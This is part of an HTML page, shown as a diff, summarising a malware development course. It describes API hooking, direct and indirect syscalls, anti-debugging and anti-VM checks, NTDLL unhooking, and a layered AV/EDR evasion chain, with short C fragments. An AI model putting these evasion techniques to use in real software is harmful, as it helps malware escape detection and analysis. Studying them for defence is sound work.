+  <h2><i class="bi bi-plugin"></i> API Hooking</h2>
+  <p>API Hooking is a technique that intercepts and modifies the behavior of API functions by modifying code at the function's address. It is both a tool used by EDR for monitoring and a technique that malware can utilize. The main hooking methods include:</p>
+
+  <h3>Detours</h3>
+  <p>Microsoft Detours is the most popular hooking library. It works by overwriting the first 5+ bytes of the target function with a jump instruction (trampoline) to the hook function. When the original function is called, the execution flow is redirected to the hook function, which can inspect/modify parameters before calling the original function or skip it entirely.</p>
+
+  <h3>MinHook Library</h3>
+  <p>MinHook is a lightweight hooking library that supports hooking multiple functions simultaneously. It provides a simple API: <code>MH_Initialize</code>, <code>MH_CreateHook</code>, <code>MH_EnableHook</code>.</p>
+
+  <h3>API Hooking Using Windows APIs</h3>
+  <p>Hooking using pure Windows APIs without external libraries. The technique: change memory protection, write jump instructions, restore protection. Can be used to build keyloggers (hook <code>GetAsyncKeyState</code> or use <code>SetWindowsHookEx</code>) or shellcode injection monitors.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 17 — SYSCALLS         -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="syscalls">
+  <h2><i class="bi bi-cpu"></i> Syscalls</h2>
+  <p>Syscalls provide a mechanism to call directly into kernel mode, bypassing the WinAPI and ntdll.dll layers. EDRs commonly hook functions in ntdll.dll to monitor API calls &mdash; by calling syscalls directly, malware completely bypasses userland hooks. However, syscall numbers change between Windows versions, so techniques are needed to determine the correct syscall number at runtime.</p>
+
+  <div class="network-diagram">Standard Flow (can be hooked by EDR):
+  Application -> kernel32.dll -> ntdll.dll -> syscall -> Kernel
+
+  Direct Syscall (bypasses EDR userland hooks):
+  Application -> syscall instruction -> Kernel
+
+  Indirect Syscall (more stealthy):
+  Application -> return to ntdll (syscall; ret) -> Kernel</div>
+
+  <h3 id="syswhispers">SysWhispers</h3>
+  <p>SysWhispers is a tool that automatically generates syscall stubs for NTAPI functions. It generates assembly code containing the syscall number and stub code for each function. SysWhispers2 improves upon this by automatically resolving syscall numbers at runtime through a sorting algorithm. SysWhispers3 adds support for indirect syscalls and other advanced techniques.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// SysWhispers2 - auto-resolve syscall number at runtime
+// Generated stub for NtAllocateVirtualMemory
+EXTERN_C NTSTATUS NtAllocateVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect);
+
+// Implementation auto-finds syscall number
+// by sorting functions in ntdll export table</code></pre>
+  </div>
+
+  <h3 id="hells-gate">Hell's Gate</h3>
+  <p>Hell's Gate is a technique for resolving syscall numbers at runtime by directly reading the code of ntdll.dll in memory. If EDR has already hooked a function in ntdll, the first bytes will be replaced with a jump instruction. Hell's Gate detects hooks by checking the first bytes of the function &mdash; if it starts with <code>mov eax, SSN</code> (4C 8B D1 B8), it has not been hooked and the syscall number can be extracted; if it starts with a jump instruction, it has been hooked.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Hell's Gate - Resolve syscall number from ntdll
+// Check if function is hooked
+// mov r10, rcx    -> 4C 8B D1
+// mov eax, SSN    -> B8 XX XX 00 00
+// If first byte is 0x4C -> not hooked, extract SSN
+// If first byte is 0xE9 or 0xFF -> hooked
+
+typedef struct _SYSCALL_ENTRY {
+    DWORD dwSSN;
+    PVOID pSyscallAddr;
+} SYSCALL_ENTRY;
+
+// Find unhooked syscall address
+// (jmp to syscall; ret instruction in ntdll)
+// Used for indirect syscalls</code></pre>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 18 — ANTI-ANALYSIS    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="anti-analysis">
+  <h2><i class="bi bi-shield-exclamation"></i> Anti-Analysis</h2>
+  <p>Anti-analysis techniques help malware remain undetected for longer periods, providing additional time to modify code and make it harder to detect. The goal is not to make malware impossible to analyze (which is impossible), but to make the analysis process more time-consuming.</p>
+
+  <h3>IsDebuggerPresent</h3>
+  <p>The simplest function to detect a debugger. However, directly calling the WinAPI's <code>IsDebuggerPresent</code> is suspicious and can be bypassed using ScyllaHide. A better approach: check PEB.BeingDebugged directly.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Custom IsDebuggerPresent - check PEB directly
+BOOL IsDebuggerPresent2() {
+#ifdef _WIN64
+    PPEB pPeb = (PEB*)(__readgsqword(0x60));
+#elif _WIN32
+    PPEB pPeb = (PEB*)(__readfsdword(0x30));
+#endif
+    return pPeb->BeingDebugged;
+}</code></pre>
+  </div>
+
+  <h3>NtQueryInformationProcess</h3>
+  <p>Use <code>NtQueryInformationProcess</code> with <code>ProcessDebugPort</code> (class 7) to check for a debugger. If it returns a non-zero value, the process is being debugged. This technique is harder to bypass because it queries the kernel object directly.</p>
+
+  <h3>Hardware Breakpoints Detection</h3>
+  <p>Detect hardware breakpoints by examining the thread context &mdash; specifically the debug registers DR0-DR3 (breakpoint addresses) and DR7 (breakpoint controls). If any of DR0-DR3 are non-zero, a debugger has placed hardware breakpoints.</p>
+
+  <h3>Timing Checks</h3>
+  <p>Use <code>GetTickCount64</code> or <code>QueryPerformanceCounter</code> to measure time between two points in the code. If the time is abnormally long, a debugger may be single-stepping through the code. Simple but effective technique.</p>
+
+  <h3>Self-Deletion</h3>
+  <p>Delete the malware's own executable file after it has started running, removing the on-disk artifact. Use <code>DeleteFile</code> combined with <code>MoveFileEx</code> using the <code>MOVEFILE_DELAY_UNTIL_REBOOT</code> flag to mark for deletion on restart, or delete directly by opening the file with <code>FILE_FLAG_DELETE_ON_CLOSE</code>.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 19 — ANTI-VM          -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="anti-vm">
+  <h2><i class="bi bi-vm"></i> Anti-Virtual Environments</h2>
+  <p>Anti-VM techniques help malware detect whether it is running in a virtual machine or sandbox. If a virtual environment is detected, the malware will execute benign code or stop entirely. This is an effective way to avoid analysis by automated sandbox systems (Cuckoo, Any.run, CrowdStrike Sandbox).</p>
+
+  <h4>Hardware Specs Check</h4>
+  <p>Check hardware specifications: RAM below 4GB, CPU cores below 2, disk size below 60GB &mdash; all indicators of a VM. Use <code>GlobalMemoryStatusEx</code>, <code>GetSystemInfo</code>, and <code>GetDiskFreeSpaceExW</code>.</p>
+
+  <h4>Machine Resolution Check</h4>
+  <p>VMs often use default resolutions (800x600, 1024x768). Check using <code>GetSystemMetrics</code> with SM_CXSCREEN and SM_CYSCREEN.</p>
+
+  <h4>Filename Check</h4>
+  <p>Some sandboxes name files according to specific patterns (hash, sample, malware). Check the current executable's filename.</p>
+
+  <h4>Running Processes Check</h4>
+  <p>Check for VM-specific processes: vmtoolsd.exe, vmwaretray.exe, vboxservice.exe, xenservice.exe.</p>
+
+  <h4>User Interaction Check</h4>
+  <p>Sandboxes typically lack user interaction. Check click counts, idle time, and cursor position. If there is no interaction for an extended period, the malware may be running in a sandbox.</p>
+
+  <h4>Multiple Delay Execution Techniques</h4>
+  <p>Sandboxes often have timeouts to avoid infinite execution. Use various delay techniques to outlast them: <code>WaitForSingleObject</code>, <code>MsgWaitForMultipleObjectsEx</code>, <code>NtWaitForSingleObject</code>, <code>NtDelayExecution</code>. Each technique has unique characteristics and is harder to patch than a simple <code>Sleep</code> call.</p>
+
+  <h4>API Hammering</h4>
+  <p>API Hammering is a technique that consumes CPU time by calling ineffective APIs repeatedly. Sandboxes often accelerate time (fast-forward Sleep), but API Hammering forces the sandbox to execute each API call, making the analysis time very long and potentially exceeding the sandbox's timeout.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 20 — EDR BYPASS       -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="edr-bypass">
+  <h2><i class="bi bi-shield-slash"></i> EDR Bypass &amp; NTDLL Unhooking</h2>
+  <p>EDRs (Endpoint Detection and Response) hook functions in ntdll.dll to monitor API calls. NTDLL Unhooking is a technique that restores the original code of ntdll.dll, removing EDR hooks. There are several unhooking methods:</p>
+
+  <h3>NTDLL Unhooking from Disk</h3>
+  <p>Read a clean copy of ntdll.dll from disk (<code>C:\Windows\System32\ntdll.dll</code>), compare it with the loaded version in memory, and overwrite the text section of the in-memory version with the clean copy from disk. Use <code>CreateFileW</code> + <code>ReadFile</code> or memory mapping to read the file.</p>
+
+  <h3>NTDLL Unhooking from KnownDlls Directory</h3>
+  <p>KnownDlls is a special directory in Windows that contains section objects for system DLLs, including ntdll.dll. These section objects contain clean (unhooked) copies of the DLLs. Use <code>NtOpenSection</code> + <code>NtMapViewOfSection</code> to map the clean copy, then copy the text section to the loaded ntdll.dll.</p>
+
+  <h3>NTDLL Unhooking from Suspended Process</h3>
+  <p>Create a new process in a suspended state (e.g., notepad.exe). This new process has a clean ntdll.dll because EDR hooks DLLs after the process starts (EDR hooks the process after initialization). Map ntdll.dll from the suspended process, copy the text section, and unmap.</p>
+
+  <h3>NTDLL Unhooking from Web Server</h3>
+  <p>Download a clean copy of ntdll.dll from a remote server, compare and overwrite the text section. This method bypasses all local hooking mechanisms but requires a network connection.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 21 — INDIRECT SYSCALLS -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="indirect-syscalls">
+  <h2><i class="bi bi-arrow-left-right"></i> Indirect Syscalls &mdash; HellsHall</h2>
+  <p>Direct Syscalls bypass userland hooks but leave a trace: the return address on the stack points to a memory region not belonging to ntdll.dll, which EDR can detect through return address checking. Indirect Syscalls solve this problem by executing the <code>syscall</code> instruction from within ntdll.dll (at a legitimate address), making the return address appear normal.</p>
+
+  <p>HellsHall combines Hell's Gate (resolve SSN) and Halos Gate (find unhooked syscall instructions in ntdll) to perform indirect syscalls. The process: find the SSN using the Hell's Gate method, find the address of a <code>syscall; ret</code> instruction within ntdll, and call that address &mdash; the return address on the stack will belong to ntdll, bypassing return address checking.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Direct vs Indirect Syscalls Comparison</div>
+    <p><strong>Direct Syscall:</strong> The syscall instruction resides in malware code. The return address on the stack points to the malware's memory region &rarr; easily detected by return address validation.</p>
+    <p><strong>Indirect Syscall:</strong> The syscall instruction resides in ntdll.dll. The return address on the stack points to an ntdll region &rarr; appears like a legitimate function call, harder to detect.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 22 — BYPASSING AVs    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="av-bypass">
+  <h2><i class="bi bi-shield-fill-x"></i> Bypassing AVs</h2>
+  <p>Effectively bypassing AV requires combining multiple techniques discussed in the previous sections. No single technique is sufficient to bypass all security solutions &mdash; a multi-layered (reverse defense-in-depth) approach is needed.</p>
+
+  <div class="network-diagram">Malware Bypass Chain (combining multiple techniques):
+
+  +-------------------------------------------------------------+
+  | 1. Payload Encryption (AES/RC4)                             |
+  |    -> Avoid static/signature detection                      |
+  +-------------------------------------------------------------+
+  | 2. Payload Obfuscation (UUID/IPv4/MAC)                      |
+  |    -> Reduce entropy, appear as legitimate data             |
+  +-------------------------------------------------------------+
+  | 3. IAT Hiding + API Hashing                                 |
+  |    -> Conceal API imports                                   |
+  +-------------------------------------------------------------+
+  | 4. NTDLL Unhooking                                          |
+  |    -> Remove EDR userland hooks                             |
+  +-------------------------------------------------------------+
+  | 5. Indirect Syscalls                                        |
+  |    -> Bypass return address checking                        |
+  +-------------------------------------------------------------+
+  | 6. Anti-Analysis + Anti-VM                                  |
+  |    -> Avoid sandbox/debugger analysis                       |
+  +-------------------------------------------------------------+
+  | 7. Mapping Injection / Function Stomping                    |
+  |    -> Avoid VirtualAllocEx/WriteProcessMemory detection     |
+  +-------------------------------------------------------------+
+  | 8. PPID Spoofing + Process Argument Spoofing                |
+  |    -> Avoid behavioral detection                            |
+  +-------------------------------------------------------------+</div>
+
+  <h3>Binary Entropy Reduction</h3>
+  <p>Encrypted payloads have high entropy &mdash; a suspicious indicator for AV. Entropy reduction techniques: insert legitimate strings, pad with the same byte, remove the CRT library (reduces size), use the EntropyReducer tool. The goal: reduce entropy to a level close to that of a normal binary.</p>
+
+  <h3>CRT Library Removal</h3>
+  <p>Removing the C Runtime Library significantly reduces binary size and entropy. Replace CRT functions with custom implementations: replace <code>memcpy</code> with a loop, replace <code>printf</code> with <code>WriteConsoleA</code>, etc. Set a custom entry point symbol to avoid needing CRT startup code.</p>
+
+  <h3>IAT Camouflage</h3>
+  <p>The compiler's dead-code elimination may remove "fake" imports added to disguise the real IAT. Use <code>#pragma comment(linker, "/include:...")</code> or volatile references to force the compiler to retain fake imports.</p>
+
+  <h3>Block DLL Policy</h3>
+  <p>Block DLL Policy is a technique that prevents EDR DLLs from being loaded into newly created processes. Use <code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code> with the <code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code> flag. Can be applied to both local and remote processes.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 23 — REFERENCES       -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="reference">
+  <h2><i class="bi bi-bookmark"></i> References</h2>
+  <p>This research document was compiled and authored based on the Malware Development course by <strong>qa210</strong>, covering 33 chapters from fundamentals to advanced topics. The content spans the entire MDLC &mdash; from basic Windows Architecture, PE Format, and DLL knowledge to advanced techniques like Indirect Syscalls, EDR Bypass, and NTDLL Unhooking.</p>
+
+  <h3>Additional Topics Covered in the Full Course</h3>
+  <table class="data-table">
+    <thead><tr><th>Topic</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td><code>Malware Signing</code></td><td>Digitally sign malware to bypass SmartScreen and trust verification</td></tr>
+      <tr><td><code>Payload Execution Control</code></td><td>Use Semaphore, Mutex, and Events to control payload execution flow</td></tr>
+      <tr><td><code>PE Header Analysis</code></td><td>Deep analysis of PE headers: RVAs, Export Table, IAT, Undocumented structures</td></tr>
+      <tr><td><code>Brute Force Decryption</code></td><td>Encrypt keys using custom functions, brute force to decrypt at runtime</td></tr>
+      <tr><td><code>NtCreateUserProcess</code></td><td>Create processes using NTAPI instead of CreateProcess, combined with PPID spoofing and block DLL</td></tr>
+      <tr><td><code>API Hammering</code></td><td>Consume CPU time to outlast sandbox timeouts</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Source</div>
+    <p>Malware Development course by qa210 &mdash; complete material with 33 chapters including theory, code demos, and practice exercises. This document summarizes the key concepts; reading the original material is recommended for a deeper understanding of each technique and hands-on practice with full code examples.</p>
+  </div>
+</section>
+
+<div class="operator-sig">
+  <div class="handle">QA210</div>
+  <div class="tagline">Research &mdash; Malware Development Fundamentals &mdash; <a href="https://w4llz.me/" target="_blank" style="color:var(--yellow-accent);text-decoration:none">W4LLZ</a></div>
+</div>
+
+</div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script>
+(function(){
+const canvas=document.getElementById('bg-canvas');
+if(!canvas)return;
+const ctx=canvas.getContext('2d');
+let w,h,particles=[];
+function resize(){w=canvas.width=innerWidth;h=canvas.height=innerHeight;particles=[];for(let i=0;i<80;i++)particles.push({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:Math.random()*1.5+.5})}
+function draw(){ctx.clearRect(0,0,w,h);particles.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=w;if(p.x>w)p.x=0;if(p.y<0)p.y=h;if(p.y>h)p.y=0;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle='rgba(56,189,248,.35)';ctx.fill()});for(let i=0;i<particles.length;i++)for(let j=i+1;j<particles.length;j++){let dx=particles[i].x-particles[j].x,dy=particles[i].y-particles[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<120){ctx.beginPath();ctx.moveTo(particles[i].x,particles[i].y);ctx.lineTo(particles[j].x,particles[j].y);ctx.strokeStyle=`rgba(56,189,248,${.12*(1-d/120)})`;ctx.stroke()}}requestAnimationFrame(draw)}
+resize();draw();addEventListener('resize',resize)
+})();
+
+(function(){
+const tocLinks=document.querySelectorAll('.toc a');
+const sections=[];
+tocLinks.forEach(a=>{const id=a.getAttribute('href')?.slice(1);if(id){const el=document.getElementById(id);if(el)sections.push({el,id,link:a})}});
+function onScroll(){
+let current=null;
+sections.forEach(s=>{if(s.el.getBoundingClientRect().top<=100)current=s});
+tocLinks.forEach(l=>l.classList.remove('active'));
+if(current)current.link.classList.add('active');
+}
+addEventListener('scroll',onScroll,{passive:true});
+onScroll();
+})();
+
+function copyCode(btn){
+const pre=btn.closest('.code-block').querySelector('pre');
+const code=pre?.textContent||'';
+navigator.clipboard.writeText(code).then(()=>{
+btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500);
+}).catch(()=>{});
+}
+
+function toggleMobileNav(){
+const o=document.getElementById('mobileOverlay');
+const p=document.getElementById('mobilePanel');
+o.classList.toggle('show');p.classList.toggle('show');
+}
+
+const obs=new IntersectionObserver(entries=>{entries.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)';obs.unobserve(e.target)}})},{threshold:.1});
+document.querySelectorAll('.section,.topic-card,.callout,.code-block,.attack-path,.network-diagram').forEach(el=>{el.style.opacity='0';el.style.transform='translateY(18px)';el.style.transition='opacity .5s,transform .5s';obs.observe(el)});
+</script>
+</body>
+</html>
